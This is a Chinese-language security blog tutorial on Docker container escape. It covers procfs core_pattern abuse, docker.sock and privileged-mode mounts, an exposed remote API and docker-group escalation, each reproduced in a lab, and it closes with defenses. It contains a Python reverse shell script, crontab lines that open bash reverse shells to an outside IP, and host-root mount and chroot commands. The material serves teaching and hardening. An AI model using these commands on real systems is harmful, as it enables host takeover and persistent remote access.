---
title: "Docker逃逸手法大全"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# Docker逃逸手法大全

Docker相关安全风险更多集中在Docker逃逸方面

和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件

## 判断是否为容器环境

在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：[快速识别虚拟主机、Docker和K8s集群环境](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/)

不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
~~~sh
ls -al /.dockerenv
~~~

![image-20250331160431814](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331160431814.png)

确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check

## 挂载宿主机procfs逃逸

### 基础概念

procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件

user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID

而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：

从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行

### 环境搭建

创建容器并挂载/proc目录：

~~~sh
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
~~~

搭建完毕

### 信息搜集

如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
~~~sh
find / -name core_pattern
~~~

![image-20250331165144667](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165144667.png)

### 漏洞利用

找到当前容器在主机下的绝对路径：
~~~sh
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
~~~

![image-20250331165346849](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165346849.png)

可以看到绝对路径为`/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work`

接下来安装vim和gcc：

~~~sh
apt-get update -y && apt-get install vim gcc -y
~~~

然后创建一个python脚本用于反弹shell：
~~~python
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "xx.xx.xx.xx"
lport = 7777
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   # os.remove('/tmp/.shell.py')
   s.close()
if __name__ == "__main__":
   main()
~~~

赋予执行权限：
~~~sh
chmod 777 .shell.py
~~~

将脚本写入到目标的proc目录下：

~~~sh
echo -e "|/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/merged/tmp/.shell.py \rcore    " >  /host/proc/sys/kernel/core_pattern
~~~

![image-20250331171439634](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331171439634.png)

在攻击机上开启监听，接下来只需要让容器崩溃重启即可执行反弹shell脚本，使用程序实现：
~~~c
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
~~~

gcc编译：
~~~sh
gcc .crash.c -o .crash
~~~

执行编译后的程序使docker崩溃触发core dump，此时宿主机/proc/sys/kernel/core_pattern 中写入的.shell.py会被执行

![image-20250331173920827](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331173920827.png)

成功监听到宿主机的反弹shell：

![image-20250331174229302](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331174229302.png)

至此，我们完成了一次挂载宿主机procfs逃逸

## 挂载docker socket逃逸

### 基础概念

Docker Socket (/var/run/docker.sock) 是 Docker 守护进程（dockerd） 与 客户端（如 docker CLI、Docker API 调用） 之间的主要通信接口，即用来与守护进程通信即查询信息或者下发命令

若容器挂载了`/var/run/docker.sock`，就相当于获得了 Docker CLI（命令行接口）的完全访问权限，通过 Docker API，可以在容器内部直接管理宿主机上的 Docker 进程，最终导致容器逃逸

### 环境搭建

创建容器并挂载`/var/run/docker.sock`文件：

~~~sh
docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
~~~

进入容器并安装docker命令行客户端：

~~~sh
docker exec -it with_docker_sock /bin/bash
apt-get update
apt-get install curl

#官网
curl -fsSL https://get.docker.com/ | sh

#阿里云镜像
curl -fsSL https://get.docker.com -o install-docker.sh
sh install-docker.sh --mirror Aliyun
~~~

至此，环境搭建完毕

### 信息搜集

直接检查是否存在`/var/run/docker.sock`文件：

~~~sh
ls -lah /var/run/docker.sock
~~~

若文件存在，则可能存在该漏洞

![image-20250402151845586](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402151845586.png)

### 漏洞利用

在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部：

~~~sh
docker run -it -v /:/host ubuntu /bin/bash
~~~

此时我们可以发现/host目录就是宿主机的根目录：

![image-20250402153914370](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402153914370.png)

那么只需要chroot将其变为根目录一下就完成了逃逸：

~~~sh
chroot /host
~~~

![image-20250402154208382](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402154208382.png)

## privileged特权模式逃逸

### 基础知识

当 Docker 容器以 `--privileged` 启动时，会获得以下权限：

- **完全设备访问权限**：可访问宿主机所有设备（如 `/dev/sda`或`vda`、`/dev/tty` 等）。
- **绕过 Linux Capabilities 限制**：默认容器仅保留部分权限（如 `CAP_CHOWN`、`CAP_NET_BIND_SERVICE`），特权模式赋予容器 **所有 Capabilities**（包括 `CAP_SYS_ADMIN`）。
- **禁用安全隔离机制**：包括 Seccomp、AppArmor/SELinux 的部分限制

在这种情况下，就有可能将宿主机文件系统挂载到容器内部造成逃逸

### 环境搭建

首先有一个普通用户 yuy0ung 并且加入了 docker 组：

~~~sh
sudo useradd -m -s /bin/bash yuy0ung
sudo passwd yuy0ung
sudo usermod -aG docker yuy0ung
su - yuy0ung
~~~

![image-20250402162542136](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402162542136.png)

在普通用户下使用`--privileged=true`创建一个容器

~~~sh
docker run --rm --privileged=true -it alpine
~~~

至此环境搭建完毕

### 信息搜集

判断是否为特权模式：
~~~sh
cat /proc/self/status | grep CapEff
~~~

如果docker是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff:

![image-20250402163607483](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163607483.png)

可见容器确实是特权模式启动

### 漏洞利用

#### 方法1

查看磁盘挂载设备：
~~~sh
fdisk -l
~~~

![image-20250402163813610](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163813610.png)

可以看到有一个39.8G的磁盘`/dev/vda3`，这就是宿主机文件，将其挂载到/test目录:
~~~sh
mkdir /test && mount /dev/vda3 /test
~~~

此时已经成功挂载宿主机根目录：
![image-20250402203050150](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203050150.png)

可以尝试读取任意文件：
![image-20250402203332217](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203332217.png)

我们还可以尝试写定时任务来反弹shell：
~~~sh
echo '* * * * * root /bin/bash -c "sh -i >& /dev/tcp/47.94.106.5/7777 0>&1"' >> /test/etc/crontab
~~~

![image-20250402224224679](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224224679.png)

成功监听到宿主机root权限的反弹shell：

![image-20250402224142981](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224142981.png)

至此，成功逃逸

#### 方法2

和前面提到的方法类似，由于我们将宿主机根目录挂载到了`/test`，而我们的shell本身权限又是root，所以这里可以直接chroot将/test改为根目录：
~~~sh
chroot /test
~~~

![image-20250402224808056](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224808056.png)

当然到这一步我们的方法不仅仅拘泥于我提到的，因为我们是高权限，所以也可以尝试在直接去添加新的root组用户并登录等操作

## docker远程API未授权访问逃逸

### 基础知识

docker remote api 可以执行 docker 命令，若配置错误将其暴露在公网，攻击者可通过远程调用 Docker API直接管理容器，进而导致逃逸getshell

### 环境搭建

将docker守护进程监听在0.0.0.0：
~~~sh
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
~~~

如果有防火墙记得开放2375端口

### 信息搜集

直接访问服务器2375端口：

![image-20250408210911881](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408210911881.png)

如果响应为上图这样既表明存在漏洞

也可以使用我们的docker尝试远程调用该端口api：
~~~sh
docker -H tcp://x.x.x.x:2375 images
~~~

![image-20250408211156682](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211156682.png)

可以看到我们成功调用该api并列出了该docker的镜像，即漏洞存在

### 漏洞利用

在这种情况下，我们相当于可以任意控制目标服务器的docker了，那么我们可以新运行一个容器，挂载点设置为服务器的根目录挂载至/yuy0ung目录下

~~~sh
docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/yuy0ung nginx:latest /bin/bash
~~~

![image-20250408211828439](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211828439.png)

那么接下来的思路就和上面差不多了，chroot或者写一个定时任务即可实现逃逸：

* chroot:

  ![image-20250408212104350](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408212104350.png)

* 定时任务监听：
  ~~~sh
  echo '* * * * * root /bin/bash -c "sh -i >& /dev/tcp/xx.xx.xx.xx/7777 0>&1"' >> /yuy0ung/etc/crontab
  ~~~

  ![image-20250408213527317](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408213527317.png)

至此成功获取宿主机权限

## 内核漏洞逃逸

就是宿主机的内核存在漏洞的情况下的一些利用，简单来说就是提权类的内核漏洞会很可能导致容器逃逸

这些内核漏洞通常是一些CVE，以CVE-2016-5195（dirty cow）为例：

和权限提升时的dirty利用方法差不太多，之所以能实现逃逸，是因为docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机，其他的利用细节不再赘述，可以参考我的这篇文章：[linux提权-内核提权](https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/)

除了脏牛，还有很多内核漏洞导致的逃逸，这里列举一些就不细讲了：

* CVE-2019-16884
* CVE-2021-3493
* CVE-2021-22555
* CVE-2022-0492
* CVE-2022-0847
* CVE-2022-23222

## docker用户组提权

该trick其实可以归类到liunx提权里面的，不过也涉及到了docker以及逃逸所以放到这里记录：

### 基础知识

Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能运行

Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，就相当于拥有了root 的访问权限

### 环境搭建

由于前面复现特权模式逃逸的时候，我们已经创建了一个yuy0ung用户并加入了docker组，所以切换到该用户即可进行复现：

![image-20250410181642354](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410181642354.png)

### 信息搜集

查看发现当前用户在docker组中：
![image-20250410195542345](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410195542345.png)

那么可以尝试docker用户组提权

### 漏洞利用

这里直接拉取一个针对上面情况的提权镜像，大致原理就是拉取镜像时将宿主机根目录挂载进docker，而docker启动后自动执行启动脚本chroot逃逸出来了，详细内容可以参考镜像的github：https://github.com/chrisfosterelli/dockerrootplease

~~~sh
docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
~~~

![image-20250410200514449](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410200514449.png)

可以看到直接就提升到root权限了，其实和前面的chroot逃逸差不多

## 针对docker逃逸的防御措施

针对上面提到的手段，可以有如下防御措施：

* 即时更新docker
* docker使用capabilities时需要遵循最小特权原则
* 尽量在启动容器时使用--user选项指定容器以非特权用户身份运行
* 不要直接挂载主机文件，尽量使用数据卷或共享文件系统
* 将容器中的root用户映射为宿主机中的普通用户
* 不要在容器中挂载docker socket，也不要将docker api配置到公网

参考链接：https://wiki.teamssix.com/CloudNative/
